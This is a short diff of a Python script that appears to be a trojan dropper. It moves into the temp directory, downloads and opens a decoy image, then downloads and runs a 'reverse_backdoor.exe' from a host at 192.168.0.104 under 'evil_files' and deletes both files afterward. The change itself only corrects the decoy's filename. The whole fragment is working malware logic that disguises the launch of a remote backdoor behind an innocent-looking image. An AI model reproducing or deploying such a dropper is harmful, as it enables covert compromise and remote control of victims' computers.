@@ -11,10 +11,10 @@ temp_directory = tempfile.gettempdir()
 os.chdir(temp_directory)
 
 download("http://192.168.0.104/evil_files/cars.jpeg")
-subprocess.Popen("car.jpeg", shell=True)
+subprocess.Popen("cars.jpeg", shell=True)
 
 download("http://192.168.0.104/evil_files/reverse_backdoor.exe")
 subprocess.call("reverse_backdoor.exe", shell=True)
 
-os.remove("car.jpeg")
+os.remove("cars.jpeg")
 os.remove("reverse_backdoor.exe")
